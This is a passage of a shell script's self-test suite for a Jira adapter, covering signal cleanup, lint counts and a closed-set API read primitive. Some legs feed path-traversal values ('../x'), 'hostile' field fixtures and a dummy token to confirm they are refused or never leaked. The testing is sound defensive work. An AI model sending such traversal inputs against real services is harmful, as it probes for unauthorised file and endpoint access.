    if [ "$q1_rc" -eq "$q1_exprc" ] && [ -n "$q1_path" ] && [ "$q1_gone" -eq 1 ]; then
      echo "PASS: selftest — Q1: a $q1_sig sent directly to _tj_rundir_run's own wrapper subshell ends it at rc $q1_exprc and removes its rundir temp (T3b-0 fix1 Q1 / T3b-core step 0b)"
    else
      echo "FAIL: selftest — Q1: $q1_sig to the wrapper subshell rc=$q1_rc (want $q1_exprc) path='$q1_path' gone=$q1_gone"; sfail=1
    fi
  done

  # --- T3b-0 fix1 Q4: tj_permissions' "prints exactly one of" contract must hold even when the
  # WRAPPER's own `mktemp -d` fails before `_tj_perm_body` ever runs — print the bare `unverified`
  # token (never empty stdout) and rc 2.
  failbin="$tmpd/failbin"; mkdir -p "$failbin"
  FB_REAL_MKTEMP=$(command -v mktemp); export FB_REAL_MKTEMP
  cat > "$failbin/mktemp" <<'FBEOF'
#!/bin/sh
if [ "$1" = "-d" ]; then exit 1; fi
exec "$FB_REAL_MKTEMP" "$@"
FBEOF
  chmod +x "$failbin/mktemp"
  PATH="$failbin:$rd_origpath"; export PATH
  q4_rc=0
  q4_out=$(tj_permissions https://ex.atlassian.net cloud AB 2>"$tmpd/q4.err") || q4_rc=$?
  PATH=$rd_origpath; export PATH
  if [ "$q4_rc" -eq 2 ] && [ "$q4_out" = "unverified" ]; then
    echo "PASS: selftest — Q4: tj_permissions prints the bare 'unverified' token and rc 2 when the wrapper's mktemp -d fails (T3b-0 fix1 Q4)"
  else
    echo "FAIL: selftest — Q4: rc=$q4_rc out='$q4_out'"; sfail=1
  fi

  # --- T3b-core step 0b (carried T3b-0 fix1 quality minor): a signal exit (130/143) from the
  # wrapper must print NOTHING — the killed body never reached "prints exactly one of", so
  # `tj_permissions` must not default to a bare newline. Stubs `_tj_rundir_run`'s own RETURN (a pure,
  # deterministic contract, not a race-prone real signal) to exercise the outer function's own
  # post-processing directly. fix1 quality-8: the stub is scoped to a SUBSHELL — `unset -f` used to
  # delete the real function outright, breaking any LATER caller in this same process.
  (
    _tj_rundir_run() { return 143; }
    permsig_rc=0
    # E1 (non-vacuity): a FILE, not `$( … )` — command substitution strips every trailing newline,
    # so a bare "\n" (the very defect this leg exists to catch) would silently read back as "".
    tj_permissions https://ex.atlassian.net cloud AB > "$tmpd/permsig.out" 2>&1 || permsig_rc=$?
    permsig_bytes=$(wc -c < "$tmpd/permsig.out" | tr -d ' ')
    if [ "$permsig_rc" -eq 143 ] && [ "$permsig_bytes" -eq 0 ]; then
      echo "PASS: selftest — tj_permissions prints nothing (not a bare newline) when the wrapper exits on a signal (T3b-core step 0b)"
    else
      echo "FAIL: selftest — tj_permissions printed $permsig_bytes byte(s) on a signal exit (rc=$permsig_rc out='$(cat "$tmpd/permsig.out" 2>/dev/null)')"
      exit 1
    fi
  ) || sfail=1

  # --- T3b-core fix1 C4 (quality 8): the leg above must not delete `_tj_rundir_run` for any LATER
  # caller in this same process — a real signal delivered directly to the wrapper (the Q1 pattern)
  # must still work after it.
  rrafter_rc=0
  rm -f "$tmpd/rrtb-path.txt"
  _tj_rundir_run _tj_rr_sig_body TERM || rrafter_rc=$?
  rrafter_path=$(cat "$tmpd/rrtb-path.txt" 2>/dev/null || true)
  rrafter_gone=0; [ -n "$rrafter_path" ] && [ ! -e "$rrafter_path" ] && rrafter_gone=1
  if [ "$rrafter_rc" -eq 143 ] && [ -n "$rrafter_path" ] && [ "$rrafter_gone" -eq 1 ]; then
    echo "PASS: selftest — _tj_rundir_run survives the minor-3 leg above for a later caller (T3b-core fix1 C4 quality-8)"
  else
    echo "FAIL: selftest — _tj_rundir_run did not survive the minor-3 leg above (rc=$rrafter_rc path='$rrafter_path' gone=$rrafter_gone)"; sfail=1
  fi

  # --- T5bc fix1 B1(a) (security Medium): _tj_id_ok gains a length bound (<=32) — a 33-char id
  # refuses before any request (the reader's own tr_list_keys_ok mirrors this bound).
  : > "$argvlog"
  b1a_rc=0
  tj_get_issue https://ex.atlassian.net cloud AB AB-999999999999999999999999999999 >/dev/null 2>"$tmpd/b1a.err" || b1a_rc=$?
  b1a_reqs=$(wc -l < "$argvlog" | tr -d ' ')
  if [ "$b1a_rc" -eq 1 ] && [ "$b1a_reqs" -eq 0 ]; then
    echo "PASS: selftest — get-issue refuses a 33-char id before any request, rc 1, zero requests, via the shared _tj_id_ok's length bound (T5bc fix1 B1a)"
  else
    echo "FAIL: selftest — get-issue did not refuse a 33-char id pre-request (rc=$b1a_rc reqs=$b1a_reqs err='$(cat "$tmpd/b1a.err" 2>/dev/null)')"; sfail=1
  fi

}

# SEMGREP-BASH-PARSE-KIT-WIDE T1: the structural lint that used to live here as
# `_tj_lint_file` moved to the shared `conformance/shell-parse-lint.sh` (security ruling
# condition 5: called, not removed — see `_tj_st_structure`'s L1 below); its rule (b) was later
# re-ruled on measurement (bracket-leading backslash; #707's `$(`-in-case-pattern control was
# retired as a false premise). Discharge pointer for TRACKER-JIRA-HYGIENE (#707)'s SD-4/SD-6
# table: was `scripts/tracker-jira.sh::_tj_lint_file`, now
# `conformance/shell-parse-lint.sh::lint_file`, with `--selftest` legs 3 and 9.
# _tj_nosemgrep_count_ok <file>: T2 L7/SD-6 — counts the lines in <file> carrying the marker
# these comments never spell out literally in prose either, to keep this file's own count
# stable. Returns 0 iff the count equals the recorded constant _TJ_NOSEMGREP_WANT, else prints
# "<got> != <want>" and returns 1. (T2-Q8) The constant is set HERE, inside the function, not at
# file (top) scope — it must not run on every CLI invocation, only when this check actually runs.
_tj_nosemgrep_count_ok() {
  _TJ_NOSEMGREP_WANT=17
  _tnc_file=$1
  _tnc_needle=nosemgrep; _tnc_needle="${_tnc_needle}:"
  _tnc_got=$(grep -c "$_tnc_needle" "$_tnc_file") || true
  if [ "$_tnc_got" -eq "$_TJ_NOSEMGREP_WANT" ]; then
    return 0
  fi
  echo "$_tnc_got != $_TJ_NOSEMGREP_WANT"
  return 1
}

# _tj_st_structure: the T2 structural-lint legs (SD-4, SD-6) — keeps semgrep parsing the
# whole adapter AND keeps the selftest split (TRACKER-JIRA-SELFTEST-SPLIT) honest.
_tj_st_structure() {
  _tls_need1=_tj_st; _tls_need1="${_tls_need1}_"
  _tls_selftest_line=$(grep -n '^# --- selftest' "$0" | head -1 | cut -d: -f1)
  _tls_cli_line=$(grep -n '^# --- CLI' "$0" | head -1 | cut -d: -f1)

  # L1 (SEMGREP-BASH-PARSE-KIT-WIDE T1, security ruling condition 5): positive — the file
  # itself carries zero structural violations, checked by CALLING the shared
  # conformance/shell-parse-lint.sh (the lint moved there; this is not a duplicate copy).
  # The negative legs that used to live here (T2 L2/L3/L8/L9: a planted one-line case, a
  # planted `$(` in a case pattern arm, five digit-heredoc-delimiter forms) moved WITH the
  # lint — they are exercised by shell-parse-lint.sh's own `--selftest`, which this repo's
  # CI/verify.sh also run.
  _tls_root=$(CDPATH='' cd "$(dirname "$0")/.." && pwd)
  # Absolute self path, not the bare "$0": when invoked as `cd scripts && sh tracker-jira.sh`,
  # $0 is the relative "tracker-jira.sh" — shell-parse-lint.sh resolves a relative argument
  # against ITS root, not the caller's cwd, so the bare relative $0 would miss the file.
  _tls_self="$(CDPATH='' cd "$(dirname "$0")" && pwd)/$(basename "$0")"
  _tls_l1rc=0
  _tls_l1out=$(sh "$_tls_root/conformance/shell-parse-lint.sh" "$_tls_self") || _tls_l1rc=$?
  if [ "$_tls_l1rc" -eq 0 ] && [ -z "$_tls_l1out" ]; then
    echo "PASS: selftest — the shared structural lint finds zero violations in the file itself (T2 L1 / SEMGREP-BASH-PARSE-KIT-WIDE T1)"
  else
    echo "FAIL: selftest — the shared structural lint found violations in the file itself: $_tls_l1out"; sfail=1
  fi

  # L4 (SD-4 i): _tj_st_ appears 0 times above '# --- selftest' and 0 times between
  # '# --- CLI' and EOF — the selftest split stays confined to its own region. Fails closed if
  # either marker's line number came back empty (grep found nothing) — an empty number would
  # otherwise pass 1,-1p / a bare ",$p" to sed and silently short-circuit the whole check (T2-Q2).
  if [ -z "$_tls_selftest_line" ] || [ -z "$_tls_cli_line" ]; then
    _tls_l4missing=""
    [ -z "$_tls_selftest_line" ] && _tls_l4missing="'# --- selftest'"
    if [ -z "$_tls_cli_line" ]; then
      if [ -n "$_tls_l4missing" ]; then _tls_l4missing="$_tls_l4missing and '# --- CLI'"; else _tls_l4missing="'# --- CLI'"; fi
    fi
    echo "FAIL: selftest — T2 L4 cannot run, the $_tls_l4missing marker is missing"; sfail=1
    return
  fi
  sed -n "1,$((_tls_selftest_line - 1))p" "$0" > "$tmpd/.st-above"
  sed -n "${_tls_cli_line},\$p" "$0" > "$tmpd/.st-below"
  _tls_l4above=$(grep -c "$_tls_need1" "$tmpd/.st-above") || true
  _tls_l4below=$(grep -c "$_tls_need1" "$tmpd/.st-below") || true
  if [ "$_tls_l4above" -eq 0 ] && [ "$_tls_l4below" -eq 0 ]; then
    echo "PASS: selftest — _tj_st_ appears only inside the selftest region (T2 L4 / SD-4 i)"
  else
    echo "FAIL: selftest — _tj_st_ leaked outside the selftest region (above=$_tls_l4above below=$_tls_l4below)"; sfail=1
  fi

  # L4 (SB-6): the two markers themselves are each unique in the file — a count, not `head -1`
  # (a `head -1` would silently accept a duplicate marker further down and mis-split the file).
  _tls_l4stcount=$(grep -c '^# --- selftest' "$0") || true
  _tls_l4clicount=$(grep -c '^# --- CLI' "$0") || true
  if [ "$_tls_l4stcount" -eq 1 ] && [ "$_tls_l4clicount" -eq 1 ]; then
    echo "PASS: selftest — exactly one '# --- selftest' and one '# --- CLI' marker line in the file (SB-6 / T2 L4)"
  else
    echo "FAIL: selftest — marker uniqueness violated ('# --- selftest' count=$_tls_l4stcount, '# --- CLI' count=$_tls_l4clicount) (SB-6 / T2 L4)"; sfail=1
  fi

  # L5 (SD-4 ii): the assignment _TJ_CURL_BIN= appears exactly once above '# --- selftest'.
  _tls_asn1=_TJ_CURL_BIN; _tls_asn1="${_tls_asn1}="
  _tls_l5count=$(grep -c "$_tls_asn1" "$tmpd/.st-above") || true
  if [ "$_tls_l5count" -eq 1 ]; then
    echo "PASS: selftest — _TJ_CURL_BIN= is assigned exactly once above the selftest region (T2 L5 / SD-4 ii)"
  else
    echo "FAIL: selftest — _TJ_CURL_BIN= was assigned $_tls_l5count time(s) above the selftest region (want 1)"; sfail=1
  fi

  # L6 (SD-4 iii): every line in _tj_selftest that calls a _tj_st_ helper is exactly
  # "  _tj_st_<name>" (two spaces, the name, nothing else).
  _tls_l6start=$(grep -n '^_tj_selftest() {' "$0" | head -1 | cut -d: -f1)
  _tls_l6relend=$(sed -n "$((_tls_l6start + 1)),\$p" "$0" | grep -n '^}' | head -1 | cut -d: -f1)
  _tls_l6end=$((_tls_l6start + _tls_l6relend))
  sed -n "${_tls_l6start},${_tls_l6end}p" "$0" > "$tmpd/.st-body"
  _tls_l6bad=0
  while IFS= read -r _tls_l6line; do
    case "$_tls_l6line" in
      *"$_tls_need1"*)
        case "$_tls_l6line" in
          "  ${_tls_need1}"*[!A-Za-z0-9_]*) _tls_l6bad=1 ;;
          "  ${_tls_need1}"*) ;;
          *) _tls_l6bad=1 ;;
        esac
        ;;
    esac
  done < "$tmpd/.st-body"
  if [ "$_tls_l6bad" -eq 0 ]; then
    echo "PASS: selftest — every _tj_st_ helper call in _tj_selftest is a bare two-space statement (T2 L6 / SD-4 iii)"
  else
    echo "FAIL: selftest — a _tj_st_ helper call in _tj_selftest is not a bare two-space statement"; sfail=1
  fi

  # S-6: the SET of `_tj_st_*() {` definitions (whole file) must equal the SET of bare calls
  # inside _tj_selftest ("$tmpd/.st-body" above) — a defined-but-uncalled helper (or a
  # called-but-undefined name) reds instead of silently passing.
  grep -oE "^${_tls_need1}[A-Za-z0-9_]*\\(\\) \\{" "$0" | sed -E 's/\(\) \{$//' | sort -u > "$tmpd/.st-defined"
  grep -E "^  ${_tls_need1}[A-Za-z0-9_]*\$" "$tmpd/.st-body" | sed -E 's/^  //' | sort -u > "$tmpd/.st-called"
  if diff -q "$tmpd/.st-defined" "$tmpd/.st-called" >/dev/null 2>&1; then
    echo "PASS: selftest — the set of _tj_st_ helper definitions equals the set of helpers called from _tj_selftest (S-6)"
  else
    echo "FAIL: selftest — defined vs called _tj_st_ helper sets differ: defined=[$(tr '\n' ' ' < "$tmpd/.st-defined")] called=[$(tr '\n' ' ' < "$tmpd/.st-called")]"; sfail=1
  fi

  # L7 (SD-6): the count of nosemgrep markers equals the recorded constant, via the shared
  # _tj_nosemgrep_count_ok — the SAME function the negative anchor below calls, so the anchor is
  # load-bearing against the real check, not a duplicated inline comparison.
  _tls_ns1=nosemgrep; _tls_ns1="${_tls_ns1}:"
  if _tj_nosemgrep_count_ok "$0" >/dev/null; then
    echo "PASS: selftest — the nosemgrep marker count matches the recorded constant ($_TJ_NOSEMGREP_WANT) (T2 L7 / SD-6)"
  else
    echo "FAIL: selftest — the nosemgrep marker count is off: $(_tj_nosemgrep_count_ok "$0") (T2 L7 / SD-6)"; sfail=1
  fi
  # Negative anchor: a scratch copy with one extra marker line — the SAME function must refuse it.
  _tls_l7copy="$tmpd/lint-l7.sh"
  cp "$0" "$_tls_l7copy"
  printf '%s\n' "# ${_tls_ns1} extra-marker-for-l7-negative-anchor" >> "$_tls_l7copy"
  if _tj_nosemgrep_count_ok "$_tls_l7copy" >/dev/null; then
    echo "FAIL: selftest — the nosemgrep-count check failed to notice a planted extra marker"; sfail=1
  else
    echo "PASS: selftest — the nosemgrep-count check would flag a planted extra marker (T2 L7 negative anchor)"
  fi

  # T2 L8 (five digit-heredoc-delimiter forms: quoted, leading-blank quoted, tab-strip,
  # leading-backslash, double-quoted) and L9 (T2-Q6: the leading-blank/spaced form) moved to
  # conformance/shell-parse-lint.sh's own `--selftest` alongside L2/L3 above — see this
  # function's L1 comment. They are not duplicated here.
}

# _tj_st_contract_read: T3a legs — the preflight's read (contract-read), a closed resource enum
# through the ONE jira-HTTP primitive. Internal op; no jq.
_tj_st_contract_read() {

  # --- leg 1: status (cloud) -> rc 0, stdout == fixture byte-for-byte, URL /rest/api/3/status ---
  : > "$argvlog"
  _tj_fx contract-status
  crout="$tmpd/.cr1.out"
  rc=0
  tj_contract_read https://ex.atlassian.net cloud status > "$crout" 2>/dev/null || rc=$?
  crurl=$(cat "$tmpd/.lasturl" 2>/dev/null || true)
  if [ "$rc" -eq 0 ] && cmp -s "$crout" "$fixdir/contract-status.json" \
     && [ "$crurl" = "https://ex.atlassian.net/rest/api/3/status" ]; then
    echo "PASS: selftest — contract-read status (cloud) matches the fixture byte-for-byte, URL /rest/api/3/status (T3a leg 1)"
  else
    echo "FAIL: selftest — contract-read status (cloud) failed (rc=$rc url='$crurl')"; sfail=1
  fi

  # --- leg 2: field (cloud) -> URL .../rest/api/3/field ---
  _tj_fx contract-field
  rc=0
  tj_contract_read https://ex.atlassian.net cloud field > "$tmpd/.cr2.out" 2>/dev/null || rc=$?
  crurl=$(cat "$tmpd/.lasturl" 2>/dev/null || true)
  if [ "$rc" -eq 0 ] && [ "$crurl" = "https://ex.atlassian.net/rest/api/3/field" ]; then
    echo "PASS: selftest — contract-read field (cloud) used /rest/api/3/field (T3a leg 2)"
  else
    echo "FAIL: selftest — contract-read field (cloud) used the wrong URL (rc=$rc url='$crurl')"; sfail=1
  fi

  # --- leg 3: the retired site-wide `workflow` resource is REFUSED pre-request (TRACKER-CONTRACT-HONEST-TIER:
  # /workflow/search is deprecated and site-wide, so nothing here may build on it) ---
  : > "$argvlog"
  rc=0
  tj_contract_read https://ex.atlassian.net cloud workflow > "$tmpd/.cr3.out" 2>/dev/null || rc=$?
  if [ "$rc" -eq 1 ] && [ ! -s "$argvlog" ] && [ ! -s "$tmpd/.cr3.out" ]; then
    echo "PASS: selftest — contract-read refuses the retired site-wide workflow resource before any request (T3a leg 3)"
  else
    echo "FAIL: selftest — contract-read still serves the site-wide workflow resource (rc=$rc)"; sfail=1
  fi

  # --- leg 4: status (datacenter) -> URL .../rest/api/2/status ---
  _tj_fx contract-status
  rc=0
  tj_contract_read https://ex.example.com datacenter status > "$tmpd/.cr4.out" 2>/dev/null || rc=$?
  crurl=$(cat "$tmpd/.lasturl" 2>/dev/null || true)
  if [ "$rc" -eq 0 ] && [ "$crurl" = "https://ex.example.com/rest/api/2/status" ]; then
    echo "PASS: selftest — contract-read status (datacenter) used /rest/api/2/status (T3a leg 4)"
  else
    echo "FAIL: selftest — contract-read status (datacenter) used the wrong URL (rc=$rc url='$crurl')"; sfail=1
  fi

  # --- leg 5: the token never on curl's argv (T5/J4), AND it IS on the -K stdin (.lastcfg) ---
  : > "$argvlog"
  rm -f "$tmpd/.lastcfg"
  _tj_fx contract-status
  tj_contract_read https://ex.atlassian.net cloud status >/dev/null 2>&1 || true
  if [ ! -s "$argvlog" ]; then
    echo "FAIL: selftest — contract-read's leg 5 call never reached curl (argv log empty — token-not-on-argv would pass vacuously) (T3a leg 5)"; sfail=1
  elif grep -q "s3cr3t-token-XYZ" "$argvlog" 2>/dev/null; then
    echo "FAIL: selftest — contract-read's token appeared on curl's argv (T3a leg 5)"; sfail=1
  else
    echo "PASS: selftest — contract-read's token never appears on curl's argv, and a request did happen (T3a leg 5)"
  fi
  if grep -qF 'user = "user@example.com:s3cr3t-token-XYZ"' "$tmpd/.lastcfg" 2>/dev/null; then
    echo "PASS: selftest — contract-read's -K stdin config carries the FULL, exact line user = \"<user>:<token>\" (S-9 / T3a leg 5)"
  else
    echo "FAIL: selftest — contract-read's -K stdin config did not carry the exact user line (S-9 / T3a leg 5): $(cat "$tmpd/.lastcfg" 2>/dev/null)"; sfail=1
  fi
  if grep -qx 'proto = "=https"' "$tmpd/.lastcfg" 2>/dev/null \
     && grep -qx 'globoff' "$tmpd/.lastcfg" 2>/dev/null \
     && grep -qx 'max-redirs = 0' "$tmpd/.lastcfg" 2>/dev/null; then
    echo "PASS: selftest — contract-read's -K stdin config carries the exact safety lines proto = \"=https\", globoff, max-redirs = 0 (SB-1 / T3a leg 5)"
  else
    echo "FAIL: selftest — contract-read's -K stdin config is missing one of the exact safety lines proto = \"=https\" / globoff / max-redirs = 0 (SB-1 / T3a leg 5): $(cat "$tmpd/.lastcfg" 2>/dev/null)"; sfail=1
  fi

  # --- leg 6: unknown resource 'bogus' -> rc 1, the fixed sentence, argv log EMPTY ---
  : > "$argvlog"
  rc=0
  crerr=$(tj_contract_read https://ex.atlassian.net cloud bogus 2>&1 >/dev/null) || rc=$?
  if [ "$rc" -eq 1 ] && [ ! -s "$argvlog" ] \
     && [ "$crerr" = "refused: contract-read resource is not one of the closed set" ]; then
    echo "PASS: selftest — contract-read refuses an unknown resource before any request (T3a leg 6)"
  else
    echo "FAIL: selftest — contract-read did not refuse the unknown resource cleanly (rc=$rc dispatched=$([ -s "$argvlog" ] && echo yes || echo no) err='$crerr')"; sfail=1
  fi

  # --- leg 7: path-shaped resource '../x' and 'status/x' -> rc 1, zero requests, no echo of it ---
  : > "$argvlog"
  rc=0
  crerr=$(tj_contract_read https://ex.atlassian.net cloud '../x' 2>&1 >/dev/null) || rc=$?
  if [ "$rc" -eq 1 ] && [ ! -s "$argvlog" ] && ! printf '%s' "$crerr" | grep -q '\.\./x'; then
    echo "PASS: selftest — contract-read refuses a path-shaped resource '../x' pre-request, no echo (T3a leg 7a)"
  else
    echo "FAIL: selftest — contract-read did not cleanly refuse '../x' (rc=$rc dispatched=$([ -s "$argvlog" ] && echo yes || echo no) err='$crerr')"; sfail=1
  fi
  : > "$argvlog"
  rc=0
  crerr=$(tj_contract_read https://ex.atlassian.net cloud 'status/x' 2>&1 >/dev/null) || rc=$?
  if [ "$rc" -eq 1 ] && [ ! -s "$argvlog" ] && ! printf '%s' "$crerr" | grep -q 'status/x'; then
    echo "PASS: selftest — contract-read refuses a path-shaped resource 'status/x' pre-request, no echo (T3a leg 7b)"
  else
    echo "FAIL: selftest — contract-read did not cleanly refuse 'status/x' (rc=$rc dispatched=$([ -s "$argvlog" ] && echo yes || echo no) err='$crerr')"; sfail=1
  fi

  # --- leg 8: unknown flavour 'server' -> rc 1, zero requests ---
  : > "$argvlog"
  rc=0
  crerr=$(tj_contract_read https://ex.atlassian.net server status 2>&1 >/dev/null) || rc=$?
  if [ "$rc" -eq 1 ] && [ ! -s "$argvlog" ] \
     && [ "$crerr" = "refused: contract-read flavour must be cloud or datacenter" ]; then
    echo "PASS: selftest — contract-read refuses an unknown flavour before any request (T3a leg 8)"
  else
    echo "FAIL: selftest — contract-read did not refuse the unknown flavour cleanly (rc=$rc dispatched=$([ -s "$argvlog" ] && echo yes || echo no) err='$crerr')"; sfail=1
  fi

  # --- leg 9: a failing request (redirect fixture) -> rc 2, stdout EMPTY (SD-5's 3xx arm) ---
  _tj_fx redirect
  rc=0
  crout9=$(tj_contract_read https://ex.atlassian.net cloud status 2>/dev/null) || rc=$?
  if [ "$rc" -eq 2 ] && [ -z "$crout9" ]; then
    echo "PASS: selftest — contract-read's stdout stays empty on a failing (redirect) request, rc 2 (T3a leg 9)"
  else
    echo "FAIL: selftest — contract-read did not fail closed on a redirect (rc=$rc out='$crout9')"; sfail=1
  fi

  # --- leg 9b (SD-5): a redirect whose response DOES carry a body -> rc 2, stdout EMPTY, the
  # marker never reaches stdout OR stderr. Leg 9's own `redirect` fixture writes an EMPTY body, so
  # it cannot prove SD-5 ("a 3xx body never reaches contract-read stdout") load-bearing; this leg
  # uses `redirect-body` (a non-empty 302 body) so a leaked body would be caught.
  _tj_fx redirect-body
  rc=0
  crout9b=$(tj_contract_read https://ex.atlassian.net cloud status 2>"$tmpd/.cr9b.err") || rc=$?
  crerr9b=$(cat "$tmpd/.cr9b.err" 2>/dev/null || true)
  if [ "$rc" -eq 2 ] && [ -z "$crout9b" ] \
     && ! printf '%s' "$crout9b" | grep -q 'TJ-REDIRECT-BODY-MARKER' \
     && ! printf '%s' "$crerr9b" | grep -q 'TJ-REDIRECT-BODY-MARKER' \
     && printf '%s' "$crerr9b" | grep -q 'jira returned a redirect'; then
    echo "PASS: selftest — a 3xx response WITH a body still yields rc 2, empty stdout, the marker absent from stdout and stderr, and the redirect sentence is present (so deleting the 3?? arm REDs this leg too) (SD-5 / T3a leg 9b)"
  else
    echo "FAIL: selftest — a 3xx body reached stdout or stderr (rc=$rc out='$crout9b' err='$crerr9b') (SD-5 / T3a leg 9b)"; sfail=1
  fi

  # --- leg 10: the CLI dispatch usage string names contract-read(internal) ---
  crusage=$(sh "$0" 2>&1 >/dev/null) || true
  if printf '%s' "$crusage" | grep -q 'contract-read(internal)'; then
    echo "PASS: selftest — the usage string names contract-read(internal) (T3a leg 10)"
  else
    echo "FAIL: selftest — the usage string does not name contract-read(internal): $crusage"; sfail=1
  fi

  # --- leg 11: wrong arg count (2 args, 4 args) -> rc 1, the arg-count sentence, zero requests ---
  : > "$argvlog"
  rc=0
  crerr11=$(tj_contract_read https://ex.atlassian.net cloud 2>&1 >/dev/null) || rc=$?
  if [ "$rc" -eq 1 ] && [ ! -s "$argvlog" ] \
     && [ "$crerr11" = "refused: contract-read requires exactly 3 arguments" ]; then
    echo "PASS: selftest — contract-read refuses 2 arguments before any request (T3a leg 11a)"
  else
    echo "FAIL: selftest — contract-read did not cleanly refuse 2 arguments (rc=$rc dispatched=$([ -s "$argvlog" ] && echo yes || echo no) err='$crerr11')"; sfail=1
  fi
  : > "$argvlog"
  rc=0
  crerr11b=$(tj_contract_read https://ex.atlassian.net cloud status extra 2>&1 >/dev/null) || rc=$?
  if [ "$rc" -eq 1 ] && [ ! -s "$argvlog" ] \
     && [ "$crerr11b" = "refused: contract-read requires exactly 3 arguments" ]; then
    echo "PASS: selftest — contract-read refuses 4 arguments before any request (T3a leg 11b)"
  else
    echo "FAIL: selftest — contract-read did not cleanly refuse 4 arguments (rc=$rc dispatched=$([ -s "$argvlog" ] && echo yes || echo no) err='$crerr11b')"; sfail=1
  fi

  # --- leg 12 (S-10): full CLI dispatch, an unknown resource -> rc 1, the resource sentence
  # (refused pre-request by tj_contract_read itself, reached only via the real `contract-read)`
  # CLI arm). This subprocess (`sh "$0"`) runs with the REAL curl binary name, not this leg's
  # shim, so the parent's own $argvlog can prove nothing about it — the exact refusal sentence IS
  # the proof that no request was attempted; the "no network" wording and the dead argv-log reset
  # against a log this subprocess never writes to have both been dropped. ---
  rc=0
  crerr12=$(sh "$0" contract-read https://ex.atlassian.net cloud bogus 2>&1 >/dev/null) || rc=$?
  if [ "$rc" -eq 1 ] \
     && printf '%s' "$crerr12" | grep -q 'refused: contract-read resource is not one of the closed set'; then
    echo "PASS: selftest — the CLI's contract-read arm refuses an unknown resource pre-request (S-10 / T3a leg 12)"
  else
    echo "FAIL: selftest — the CLI's contract-read arm did not refuse cleanly (rc=$rc err='$crerr12')"; sfail=1
  fi
}

# _tj_st_preflight_reads: TRACKER-PREFLIGHT-TIER-CARD legs — the five preflight reads (probe, server-info,
# perms, visibility, epic-model). Each resource has a positive and a negative leg; the method set and the S-6
# gate have their own legs. Bodies are recorded pf-* fixtures; transport legs reuse the synthetic shim cases.
_tj_st_preflight_reads() {
  # _pf_leg <label> <want-rc> <want-stdout> <args to tj_contract_read...>: exact stdout AND rc.
  _pf_leg() {
    _pfl_label=$1; _pfl_wrc=$2; _pfl_want=$3; shift 3
    _pfl_rc=0
    _pfl_got=$(tj_contract_read "$@" 2>/dev/null) || _pfl_rc=$?
    if [ "$_pfl_rc" -eq "$_pfl_wrc" ] && [ "$_pfl_got" = "$_pfl_want" ]; then
      echo "PASS: selftest — contract-read preflight: $_pfl_label"
    else
      echo "FAIL: selftest — contract-read preflight: $_pfl_label (rc=$_pfl_rc want=$_pfl_wrc out='$_pfl_got')"; sfail=1
    fi
  }
  _pf_b=https://ex.atlassian.net
  _pf_d=https://jira.example.com

  # --- probe × {ok, app, 401, 403, 404, curl-fail, 3xx, 5xx, hostile type} ---
  _tj_fx pf-myself-atlassian
  _pf_leg "probe ok prints reach/auth/type/via and never the name or email" 0 "$(printf 'reach\tok\nauth\tok\ntype\tatlassian\nvia\tdirect')" "$_pf_b" cloud probe
  _tj_fx pf-myself-app
  _pf_leg "probe ok, app account" 0 "$(printf 'reach\tok\nauth\tok\ntype\tapp\nvia\tdirect')" "$_pf_b" cloud probe
  _tj_fx unauthorized
  _pf_leg "probe 401 is rc 0 with auth 401" 0 "$(printf 'reach\tok\nauth\t401\ntype\tunknown\nvia\tdirect')" "$_pf_b" cloud probe
  _tj_fx forbidden
  _pf_leg "probe 403 is rc 0 with auth 403" 0 "$(printf 'reach\tok\nauth\t403\ntype\tunknown\nvia\tdirect')" "$_pf_b" cloud probe
  _tj_fx not-found
  _pf_leg "probe 404 is reach ok, auth unknown" 0 "$(printf 'reach\tok\nauth\tunknown\ntype\tunknown\nvia\tdirect')" "$_pf_b" cloud probe
  _tj_fx curl-fail
  _pf_leg "probe transport failure is unreachable, rc 0, via unknown" 0 "$(printf 'reach\tunreachable\nauth\tunknown\ntype\tunknown\nvia\tunknown')" "$_pf_b" cloud probe
  _tj_fx redirect
  _pf_leg "probe 3xx is redirect, rc 0" 0 "$(printf 'reach\tredirect\nauth\tunknown\ntype\tunknown\nvia\tdirect')" "$_pf_b" cloud probe
  _tj_fx server-error
  _pf_leg "probe 5xx after retries is error, rc 0" 0 "$(printf 'reach\terror\nauth\tunknown\ntype\tunknown\nvia\tdirect')" "$_pf_b" cloud probe
  _tj_fx rate-limited
  _pf_leg "probe 429 is error, rc 0" 0 "$(printf 'reach\terror\nauth\tunknown\ntype\tunknown\nvia\tdirect')" "$_pf_b" cloud probe
  _tj_fx pf-myself-hostile
  _pf_leg "S-6: a hostile accountType prints unknown, never the value" 0 "$(printf 'reach\tok\nauth\tok\ntype\tunknown\nvia\tdirect')" "$_pf_b" cloud probe
  _tj_fx pf-myself-atlassian
  _pf_leg "probe refuses an extra argument (rc 1)" 1 "" "$_pf_b" cloud probe extra
  : > "$argvlog"; _tj_fx pf-myself-atlassian
  tj_contract_read "$_pf_b" datacenter probe >/dev/null 2>&1 || true
  if [ "$(cat "$tmpd/.lasturl" 2>/dev/null)" = "$_pf_b/rest/api/2/myself" ]; then
    echo "PASS: selftest — contract-read preflight: probe (datacenter) used /rest/api/2/myself"
  else
    echo "FAIL: selftest — contract-read preflight: probe (datacenter) used the wrong URL ($(cat "$tmpd/.lasturl" 2>/dev/null))"; sfail=1
  fi

  # --- server-info × {Cloud, Server, DataCenter, hostile} ---
  _tj_fx pf-serverinfo-cloud
  _pf_leg "server-info Cloud -> cloud + digits build" 0 "$(printf 'deployment\tcloud\nbuild\t100234')" "$_pf_b" cloud server-info
  _tj_fx pf-serverinfo-server
  _pf_leg "server-info Server -> datacenter" 0 "$(printf 'deployment\tdatacenter\nbuild\t9120003')" "$_pf_d" datacenter server-info
  _tj_fx pf-serverinfo-datacenter
  _pf_leg "server-info DataCenter -> datacenter" 0 "$(printf 'deployment\tdatacenter\nbuild\t9120003')" "$_pf_d" datacenter server-info
  _tj_fx pf-serverinfo-hostile
  _pf_leg "S-6: a hostile deploymentType and build print unknown" 0 "$(printf 'deployment\tunknown\nbuild\tunknown')" "$_pf_b" cloud server-info
  _tj_fx server-error
  _pf_leg "server-info on a failed read is rc 2 with empty stdout" 2 "" "$_pf_b" cloud server-info

  # --- perms × {all-yes, browse-only, hostile, bad key, URL} ---
  _tj_fx pf-perms-all-yes
  _pf_leg "perms all-yes prints six yes lines in the fixed order" 0 "$(printf 'BROWSE_PROJECTS\tyes\nCREATE_ISSUES\tyes\nEDIT_ISSUES\tyes\nTRANSITION_ISSUES\tyes\nASSIGN_ISSUES\tyes\nADMINISTER_PROJECTS\tyes')" "$_pf_b" cloud perms AB
